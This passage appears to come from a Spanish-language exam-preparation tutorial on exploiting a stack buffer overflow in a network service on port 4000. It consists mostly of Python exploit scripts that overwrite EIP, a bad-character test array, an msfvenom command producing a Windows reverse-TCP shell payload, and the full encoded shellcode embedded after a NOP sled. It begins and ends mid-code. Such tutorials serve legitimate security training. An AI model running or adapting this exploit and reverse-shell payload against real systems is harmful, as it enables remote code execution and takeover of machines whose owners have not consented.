  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ipAddress</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;USER &quot;</span> <span class="o">+</span> <span class="n">buffer</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="p">)</span>
  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
<span class="k">except</span><span class="p">:</span>
  <span class="nb">print</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Error de conexión...</span><span class="se">\n</span><span class="s2">&quot;</span>
  <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div>

<p>El caracter "C" lo meto como Padding para hacer relleno hasta llegar a los 900 (para trabajar con cifras redondas).</p>
<p>Tras la ejecución del script, desde el <strong>Immunity Debugger</strong> veremos que una vez se produce la violación de segmento, el registro <strong>EIP</strong> toma el valor <strong>42424242</strong>, equivalente a <em>"B"*4</em>. Llegados a este punto, es hora de encontrar el lugar en el que situar nuestro Shellcode.</p>
<h4 id="situando-y-asignando-espacio-al-shellcode">Situando y Asignando Espacio al Shellcode<a class="headerlink" href="#situando-y-asignando-espacio-al-shellcode" title="Permanent link">&para;</a></h4>
<p>A la hora de hacer Padding con el caracter "C" tras sobrescribir previamente el registro <strong>EIP</strong>, podremos ver desde el <strong>Immunity Debugger</strong> como el registro <strong>ESP</strong> coincide con nuestro relleno. Llegados a este punto, para el caso que estamos tratando se podría decir que nuestro shellcode tendría que tener un total de 87 bytes, cosa que escapa de la realidad, pues en la mayoría de las veces para entablar una conexión reversa se generan un total de 351 bytes aproximadamente desde <strong>msfvenom</strong>.</p>
<p>La idea aquí, es rezar 2 padres nuestros para que tras ampliar considerablemente el relleno, el servicio no crashee de otra forma. En caso de "<em>crashing</em>" (vamos a llamarlo así), si vemos que el registro <strong>EIP</strong> ya no vale lo que debería, tendremos que ver hasta qué tamaño podemos hacer relleno sin que el servicio corrompa de otra manera alternativa.</p>
<p>Hay casos como el de Linux que explicaré donde sólo contamos con 7 bytes de espacio. En ese caso la idea consiste en aprovechar estos 7 bytes para a través de 5 bytes definir ciertas instrucciones de desplazamiento y salto entre registros, permitiéndonos insertar nuestro Shellcode en un nuevo registro donde contamos con el espacio suficiente.</p>
<p>Pero para el caso, y de cara a la examinación... no habrá que preocuparse. Modificamos para ello el script de la siguiente forma:</p>
<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/python</span>
<span class="c1"># coding: utf-8</span>

<span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span><span class="nn">socket</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
  <span class="nb">print</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Uso: python&quot;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot; &lt;dirección-ip&gt;</span><span class="se">\n</span><span class="s2">&quot;</span>
  <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">buffer</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">809</span> <span class="o">+</span> <span class="s2">&quot;B&quot;</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="s2">&quot;C&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">1300</span><span class="o">-</span><span class="mi">809</span><span class="o">-</span><span class="mi">4</span><span class="p">)</span>

<span class="n">ipAddress</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>

<span class="n">port</span> <span class="o">=</span> <span class="mi">4000</span>

<span class="k">try</span><span class="p">:</span>
  <span class="nb">print</span> <span class="s2">&quot;Enviando búffer...&quot;</span>
  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ipAddress</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;USER &quot;</span> <span class="o">+</span> <span class="n">buffer</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="p">)</span>
  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
<span class="k">except</span><span class="p">:</span>
  <span class="nb">print</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Error de conexión...</span><span class="se">\n</span><span class="s2">&quot;</span>
  <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div>

<p>En este caso ampliamos de forma considerable nuestro relleno, donde tras sobrescribir el registro <strong>EIP</strong>, contamos con un total de 487 bytes de espacio donde los caracteres "C" serán situados. En caso de ver desde <strong>Immunity Debugger</strong> que todo figura como lo esperado, podremos quedarnos tranquilos, pues tenemos espacio suficiente para depositar nuestro Shellcode sobre el registro <strong>ESP</strong>.</p>
<h4 id="detectando-los-badchars">Detectando los Badchars<a class="headerlink" href="#detectando-los-badchars" title="Permanent link">&para;</a></h4>
<p>Esta será la única complicación del examen, y cuando digo complicación la sitúo entre comillas gestualmente hablando. </p>
<p>A la hora de generar nuestro Shellcode, existen ciertos caracteres que en función del servicio con el que estemos tratando no son aceptados, causando una ejecución errónea de las instrucciones que pretendamos inyectar a nivel de sistema.</p>
<p>Detectar estos caracteres no es nada complejo, lo único que necesitamos es una estructura como la siguiente:</p>
<p><code>"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"</code></p>
<p>A fin de detectar cuáles de estos caracteres no son aceptados por el servicio, configuramos nuestro script de la siguiente forma:</p>
<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/python</span>
<span class="c1"># coding: utf-8</span>

<span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span><span class="nn">socket</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
  <span class="nb">print</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Uso: python&quot;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot; &lt;dirección-ip&gt;</span><span class="se">\n</span><span class="s2">&quot;</span>
  <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">badchars</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&quot;</span><span class="se">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="n">buffer</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">809</span> <span class="o">+</span> <span class="s2">&quot;B&quot;</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="n">badchars</span> <span class="o">+</span> <span class="s2">&quot;C&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">1300</span><span class="o">-</span><span class="mi">809</span><span class="o">-</span><span class="mi">4</span><span class="o">-</span><span class="mi">255</span><span class="p">)</span>

<span class="n">ipAddress</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>

<span class="n">port</span> <span class="o">=</span> <span class="mi">4000</span>

<span class="k">try</span><span class="p">:</span>
  <span class="nb">print</span> <span class="s2">&quot;Enviando búffer...&quot;</span>
  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ipAddress</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;USER &quot;</span> <span class="o">+</span> <span class="n">buffer</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="p">)</span>
  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
<span class="k">except</span><span class="p">:</span>
  <span class="nb">print</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Error de conexión...</span><span class="se">\n</span><span class="s2">&quot;</span>
  <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div>

<p>Desde <strong>Immunity Debugger</strong>, tras la ejecución del script podremos ver una vez se produce el desbordamiento del búfer los valores que están siendo depositados sobre el registro ESP, correspondiente a nuestros badchars. La idea aquí es caracter que no veamos, caracter que debemos desechar en el envío de nuestros badchars.</p>
<p>Generalmente, los caracteres <strong>\x0a</strong> y <strong>\x0d</strong> suelen ser badchars, pero pueden varían en función del servicio que estemos utilizando. Algo importante a tener en cuenta es el caracter <strong>\x00</strong>, badchar que por norma general no suele ser incluido de forma visual en la estructura de badchars, pues es genérico y siempre debe ser omitido a la hora de generar nuestro Shellcode.</p>
<p>Suponiendo que hemos detectado que los badchars para este caso son <strong>\x00\x0a\x0d</strong>, lo único que nos queda ya es generar nuestro Shellcode. </p>
<h4 id="generando-el-shellcode">Generando el Shellcode<a class="headerlink" href="#generando-el-shellcode" title="Permanent link">&para;</a></h4>
<p>El shellcode que se generará a continuación, lo que nos hará será entablar una conexión TCP reversa contra el equipo. Para ello, seguimos la siguiente sintaxis:</p>
<div class="codehilite"><pre><span></span><code><span class="o">$~</span><span class="w"> </span><span class="n">msfvenom</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="n">windows</span><span class="o">/</span><span class="n">shell_reverse_tcp</span><span class="w"> </span><span class="n">lhost</span><span class="o">=</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="w"> </span><span class="n">lport</span><span class="o">=</span><span class="mi">443</span><span class="w"> </span><span class="o">-</span><span class="n">a</span><span class="w"> </span><span class="n">x86</span><span class="w"> </span><span class="o">--</span><span class="n">platform</span><span class="w"> </span><span class="n">windows</span><span class="w"> </span><span class="o">-</span><span class="n">b</span><span class="w"> </span><span class="s2">&quot;</span><span class="se">\x00\x0a\x0d</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="n">x86</span><span class="o">/</span><span class="n">shikata_ga_nai</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="n">c</span>

<span class="n">Found</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">compatible</span><span class="w"> </span><span class="n">encoders</span>
<span class="n">Attempting</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">encode</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">iterations</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">x86</span><span class="o">/</span><span class="n">shikata_ga_nai</span>
<span class="n">x86</span><span class="o">/</span><span class="n">shikata_ga_nai</span><span class="w"> </span><span class="n">succeeded</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">size</span><span class="w"> </span><span class="mi">351</span><span class="w"> </span><span class="p">(</span><span class="n">iteration</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
<span class="n">x86</span><span class="o">/</span><span class="n">shikata_ga_nai</span><span class="w"> </span><span class="n">chosen</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">final</span><span class="w"> </span><span class="n">size</span><span class="w"> </span><span class="mi">351</span>
<span class="n">Payload</span><span class="w"> </span><span class="n">size</span><span class="p">:</span><span class="w"> </span><span class="mi">351</span><span class="w"> </span><span class="n">bytes</span>
<span class="n">Final</span><span class="w"> </span><span class="n">size</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="n">file</span><span class="p">:</span><span class="w"> </span><span class="mi">1500</span><span class="w"> </span><span class="n">bytes</span>
<span class="n">unsigned</span><span class="w"> </span><span class="nb">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>
<span class="s2">&quot;</span><span class="se">\xba\xfc\xb2\xc0\x24\xdb\xd3\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x52\x83\xc7\x04\x31\x57\x0e\x03\xab\xbc\x22\xd1\xaf\x29\x20</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x1a\x4f\xaa\x45\x92\xaa\x9b\x45\xc0\xbf\x8c\x75\x82\xed\x20</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xfd\xc6\x05\xb2\x73\xcf\x2a\x73\x39\x29\x05\x84\x12\x09\x04</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x06\x69\x5e\xe6\x37\xa2\x93\xe7\x70\xdf\x5e\xb5\x29\xab\xcd</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x29\x5d\xe1\xcd\xc2\x2d\xe7\x55\x37\xe5\x06\x77\xe6\x7d\x51</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x57\x09\x51\xe9\xde\x11\xb6\xd4\xa9\xaa\x0c\xa2\x2b\x7a\x5d</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x4b\x87\x43\x51\xbe\xd9\x84\x56\x21\xac\xfc\xa4\xdc\xb7\x3b</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xd6\x3a\x3d\xdf\x70\xc8\xe5\x3b\x80\x1d\x73\xc8\x8e\xea\xf7</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x96\x92\xed\xd4\xad\xaf\x66\xdb\x61\x26\x3c\xf8\xa5\x62\xe6</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x61\xfc\xce\x49\x9d\x1e\xb1\x36\x3b\x55\x5c\x22\x36\x34\x09</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x87\x7b\xc6\xc9\x8f\x0c\xb5\xfb\x10\xa7\x51\xb0\xd9\x61\xa6</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xb7\xf3\xd6\x38\x46\xfc\x26\x11\x8d\xa8\x76\x09\x24\xd1\x1c</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xc9\xc9\x04\xb2\x99\x65\xf7\x73\x49\xc6\xa7\x1b\x83\xc9\x98</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x3c\xac\x03\xb1\xd7\x57\xc4\xc1\x27\x57\x15\x56\x2a\x57\x14</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x1d\xa3\xb1\x7c\x71\xe2\x6a\xe9\xe8\xaf\xe0\x88\xf5\x65\x8d</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x8b\x7e\x8a\x72\x45\x77\xe7\x60\x32\x77\xb2\xda\x95\x88\x68</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x72\x79\x1a\xf7\x82\xf4\x07\xa0\xd5\x51\xf9\xb9\xb3\x4f\xa0</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x13\xa1\x8d\x34\x5b\x61\x4a\x85\x62\x68\x1f\xb1\x40\x7a\xd9</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x3a\xcd\x2e\xb5\x6c\x9b\x98\x73\xc7\x6d\x72\x2a\xb4\x27\x12</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xab\xf6\xf7\x64\xb4\xd2\x81\x88\x05\x8b\xd7\xb7\xaa\x5b\xd0</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xc0\xd6\xfb\x1f\x1b\x53\x0b\x6a\x01\xf2\x84\x33\xd0\x46\xc9</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xc3\x0f\x84\xf4\x47\xa5\x75\x03\x57\xcc\x70\x4f\xdf\x3d\x09</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xc0\x8a\x41\xbe\xe1\x9e</span><span class="s2">&quot;</span>
</code></pre></div>

<p>Una vez generado el shellcode, lo añadimos a nuestro script de la siguiente forma:</p>
<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/python</span>
<span class="c1"># coding: utf-8</span>

<span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span><span class="nn">socket</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
  <span class="nb">print</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Uso: python&quot;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot; &lt;dirección-ip&gt;</span><span class="se">\n</span><span class="s2">&quot;</span>
  <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&quot;</span><span class="se">\xba\xfc\xb2\xc0\x24\xdb\xd3\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x52\x83\xc7\x04\x31\x57\x0e\x03\xab\xbc\x22\xd1\xaf\x29\x20</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x1a\x4f\xaa\x45\x92\xaa\x9b\x45\xc0\xbf\x8c\x75\x82\xed\x20</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xfd\xc6\x05\xb2\x73\xcf\x2a\x73\x39\x29\x05\x84\x12\x09\x04</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x06\x69\x5e\xe6\x37\xa2\x93\xe7\x70\xdf\x5e\xb5\x29\xab\xcd</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x29\x5d\xe1\xcd\xc2\x2d\xe7\x55\x37\xe5\x06\x77\xe6\x7d\x51</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x57\x09\x51\xe9\xde\x11\xb6\xd4\xa9\xaa\x0c\xa2\x2b\x7a\x5d</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x4b\x87\x43\x51\xbe\xd9\x84\x56\x21\xac\xfc\xa4\xdc\xb7\x3b</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xd6\x3a\x3d\xdf\x70\xc8\xe5\x3b\x80\x1d\x73\xc8\x8e\xea\xf7</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x96\x92\xed\xd4\xad\xaf\x66\xdb\x61\x26\x3c\xf8\xa5\x62\xe6</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x61\xfc\xce\x49\x9d\x1e\xb1\x36\x3b\x55\x5c\x22\x36\x34\x09</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x87\x7b\xc6\xc9\x8f\x0c\xb5\xfb\x10\xa7\x51\xb0\xd9\x61\xa6</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xb7\xf3\xd6\x38\x46\xfc\x26\x11\x8d\xa8\x76\x09\x24\xd1\x1c</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xc9\xc9\x04\xb2\x99\x65\xf7\x73\x49\xc6\xa7\x1b\x83\xc9\x98</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x3c\xac\x03\xb1\xd7\x57\xc4\xc1\x27\x57\x15\x56\x2a\x57\x14</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x1d\xa3\xb1\x7c\x71\xe2\x6a\xe9\xe8\xaf\xe0\x88\xf5\x65\x8d</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x8b\x7e\x8a\x72\x45\x77\xe7\x60\x32\x77\xb2\xda\x95\x88\x68</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x72\x79\x1a\xf7\x82\xf4\x07\xa0\xd5\x51\xf9\xb9\xb3\x4f\xa0</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x13\xa1\x8d\x34\x5b\x61\x4a\x85\x62\x68\x1f\xb1\x40\x7a\xd9</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x3a\xcd\x2e\xb5\x6c\x9b\x98\x73\xc7\x6d\x72\x2a\xb4\x27\x12</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xab\xf6\xf7\x64\xb4\xd2\x81\x88\x05\x8b\xd7\xb7\xaa\x5b\xd0</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xc0\xd6\xfb\x1f\x1b\x53\x0b\x6a\x01\xf2\x84\x33\xd0\x46\xc9</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xc3\x0f\x84\xf4\x47\xa5\x75\x03\x57\xcc\x70\x4f\xdf\x3d\x09</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xc0\x8a\x41\xbe\xe1\x9e</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="n">buffer</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">809</span> <span class="o">+</span> <span class="s2">&quot;B&quot;</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x90</span><span class="s2">&quot;</span><span class="o">*</span><span class="mi">16</span> <span class="o">+</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="s2">&quot;C&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">1300</span><span class="o">-</span><span class="mi">809</span><span class="o">-</span><span class="mi">4</span><span class="o">-</span><span class="mi">16</span><span class="o">-</span><span class="mi">351</span><span class="p">)</span>

<span class="n">ipAddress</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>

<span class="n">port</span> <span class="o">=</span> <span class="mi">4000</span>

<span class="k">try</span><span class="p">:</span>
  <span class="nb">print</span> <span class="s2">&quot;Enviando búffer...&quot;</span>
  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
